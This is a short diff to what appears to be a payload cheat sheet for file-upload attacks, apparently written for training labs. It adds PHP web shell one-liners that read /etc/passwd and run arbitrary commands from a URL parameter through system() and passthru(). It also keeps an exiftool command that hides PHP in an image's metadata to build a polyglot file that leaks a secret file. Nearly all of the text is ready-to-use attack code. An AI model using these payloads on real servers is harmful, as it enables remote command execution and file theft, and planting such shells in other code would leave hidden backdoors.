@@ -1,5 +1,6 @@
-<?php echo file_get_contents('/home/carlos/secret'); ?>
-<?php system($_GET['cmd']); ?>
+<?php echo file_get_contents('/etc/passwd'); ?> >> To read files
+<?php system($_GET['cmd']); ?> >> For system command
+<?php passthru($_GET['cyborg71']); ?> >> For system command*
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
 
 #Apache Bypass
